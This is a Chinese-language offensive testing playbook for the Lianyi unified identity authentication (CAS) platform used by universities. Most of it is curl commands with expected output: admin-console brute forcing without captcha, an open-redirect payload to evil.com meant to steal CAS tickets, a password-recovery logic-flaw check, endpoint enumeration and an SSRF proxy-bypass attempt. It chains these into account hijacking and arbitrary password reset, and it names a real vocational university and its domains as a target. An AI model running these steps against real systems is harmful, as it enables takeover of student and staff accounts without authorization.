# Lianyi CAS (联奕统一身份认证 / lyuapServer) 测试模式

## 识别特征

联奕科技(LIANYI TECHNOLOGY CO.,LTD.)统一身份认证平台，后端为Liferay Portal + Apache Tomcat 7.x。

| 特征 | 值 |
|------|-----|
| CAS登录路径 | `/lyuapServer/login` |
| 管理后台 | `/ly_web_casconsole/system/login!login.action` |
| 页面标题 | "统一身份认证平台" / "统一身份认证管理平台" |
| 版权信息 | `Copyright © 2004-2017 LIANYI TECHNOLOGY CO.,LTD.` |
| 前端JS | `/lyuapServer/js/cas.js`, `slider.js`, `qrcode.js` |
| CSS | `/lyuapServer/css/cas.css` |
| 加密方式 | RSA (BigInt.js + Barrett.js) |
| 验证码 | `captcha.jsp` (JSP, 4位数字) |
| 服务器头 | `Apache-Coyote/1.1` |
| 后端指纹 | Liferay Portal (`COOKIE_SUPPORT=true`, `/c/portal/login`, `p_l_id=XXXXX`) |
| LT token格式 | `LT-XXXXX-xxx-cas01.example.org` (泄露内部主机名) |
| 密码找回 | `/safe/index.jsp`, `/safe/findPassByOther.jsp`, `/safe/knowledge.jsp` |
| 初始密码说明 | `https://HOST/help/csmm.pdf` (可能404) |

## 管理后台 (ly_web_casconsole)

登录表单字段: `myusername` + `password` (不同于CAS用户登录的 `username` + `password`)
**无验证码保护** — 可直接POST暴力破解。

```bash
# 管理后台登录页
curl -sk "https://HOST/ly_web_casconsole/system/login!login.action"

# 登录尝试 (无验证码)
curl -sk -X POST "https://HOST/ly_web_casconsole/system/login!logincheck.action" \
  -d "myusername=admin&password=admin123"

# 验证码获取 (JSON明文)
RAND=$(curl -s -c /tmp/cas.txt 'https://HOST/ly_web_casconsole/system/login!getyzm.action' \
  | grep -oP '"rand":"\K[^"]+')

# 带验证码登录
curl -sk -b /tmp/cas.txt 'https://HOST/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=123456&captcha=${RAND}"
# 成功返回: {"success":true}
# 失败返回: 页面刷新或 {"success":false}
```

## CAS协议端点

```bash
# CAS 1.0
curl -sk "http://HOST/lyuapServer/validate?service=SERVICE&ticket=TICKET"
# CAS 2.0
curl -sk "http://HOST/lyuapServer/serviceValidate?service=SERVICE&ticket=TICKET"
curl -sk "http://HOST/lyuapServer/proxyValidate?service=SERVICE&ticket=TICKET"
# CAS 3.0
curl -sk "http://HOST/lyuapServer/p3/serviceValidate?service=SERVICE&ticket=TICKET"
```

## Open Redirect

```bash
# service参数无白名单校验
curl -sk "http://HOST/lyuapServer/login?service=https://evil.com/steal" \
  | grep -oP 'action="[^"]*"'
# 返回: action="/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal"
```

## Liferay Portal API

```bash
# JSONWS invoke (返回反序列化错误 = 端点存在)
curl -sk -X POST "http://HOST/api/jsonws/invoke" -d 'cmd=%2Fuser%2Fget-current-user'
# 返回: {"exception":"Unable to deserialize object"}

# 其他Liferay端点
/api/jsonws           # JSONWS API (200/500 = 存在)
/api/axis             # SOAP (403 = 存在, 需认证)
/c/document_library   # 文档库
/c/message_boards     # 留言板
/c/portal/update_password  # 密码更新
/o/                   # OSGi (503 + Tomcat版本泄露)
```

## Tomcat版本泄露

```bash
curl -sk "http://HOST/o/" | grep "Apache Tomcat"
# 返回: <h3>Apache Tomcat/7.0.109</h3>
```

## 密保逻辑缺陷验证

```bash
# 所有用户返回true = 密保校验逻辑缺陷
curl -sk "https://HOST/safe/checkquestionbinding.jsp" -X POST -d 'account=admin'
curl -sk "https://HOST/safe/checkquestionbinding.jsp" -X POST -d 'account=nonexistentuser12345'
# 两者都返回: true
```

## 密码重置流程

1. `findPassByOther.jsp` → 输入账号/姓名/身份证
2. `yanzhengma.jsp` → 获取验证码(返回明文JSON)
3. `checkaccountmassage.jsp` → 验证账号信息
4. `checkquestionbinding.jsp` → 检查密保(返回true)
5. `changepwdbyquestion.jsp` → 回答密保问题
6. `changepwd.jsp` → 设置新密码

## CAS用户登录枚举

```bash
# 登录页面
curl -sk "http://HOST/lyuapServer/login"
# 表单: username(职工号/学号/别名) + password + captcha
# 手机重置: phonenumber + phonecode 字段
# 技术咨询电话: 通常在页面底部泄露
```

## 漏洞组合利用

- **高危**: 管理后台无验证码(getyzm.action明文) + 无账号锁定 = 暴力破解CAS管理后台
- **中危**: Open Redirect + CAS票据窃取 = 全校师生账户劫持
- **中危**: 验证码客户端校验 + 密保逻辑缺陷 = 任意用户密码重置

## 与其他CAS变体对比

| 特征 | 金智教育 | ycServer | Apereo+PAC4J | 联奕Lianyi |
|------|---------|----------|-------------|-----------|
| CAS路径 | /authserver/ | /authserver/ | /cas/ | /lyuapServer/ |
| 管理后台 | 无 | 无 | 无 | /ly_web_casconsole/ |
| 加密 | AES(salt) | AES(salt) | 无 | RSA |
| 验证码 | captcha-getcode.do | getCaptcha.htl | 原生 | captcha.jsp |
| 后端 | Spring | Spring Boot | Apereo CAS | Liferay Portal |
| 服务器 | openresty | Tomcat | Tomcat | Tomcat(隐藏) |

## Liferay Proxy Servlet

```bash
# 存在但IP限制 (返回403 + 泄露访问者IP)
curl -sk "http://HOST/api/liferay/proxy?url=http://127.0.0.1:8080/"
# 返回: 403 "Access denied for X.X.X.X"

# 尝试IP绕过 (均失败)
curl -sk -H "X-Forwarded-For: 127.0.0.1" "http://HOST/api/liferay/proxy?url=http://127.0.0.1/"
curl -sk -H "X-Real-IP: 127.0.0.1" "http://HOST/api/liferay/proxy?url=http://127.0.0.1/"
```

## ⚠️ Tomcat 7.0.109 CVE陷阱

**7.0.109是7.x最后版本(EOL), 以下CVE不适用:**
- CVE-2023-45648/42795/41080: 仅影响8.5.x/9.x/10.x
- CVE-2020-7961 (Liferay JSONWS RCE): 需认证

**报告中引用CVE前必须验证版本适用性。**

## 联奕生态子系统

联奕CAS通常保护: `/lyoa/` `/lyhr/` `/lycrm/` `/lymail/` `/lybpm/` (全部302到CAS登录)

## 实战案例

- 新疆交通职业技术大学 (xjjtedu.com / xjjtxy.cn) — 2026-06-01/06-08
  - 管理后台公网暴露, Open Redirect, 验证码明文泄露, 堆栈泄露, 密保逻辑缺陷
  - 共11个漏洞 (高1/中6/低4)
  - 详细: `references/xjjtedu-testing-patterns.md`
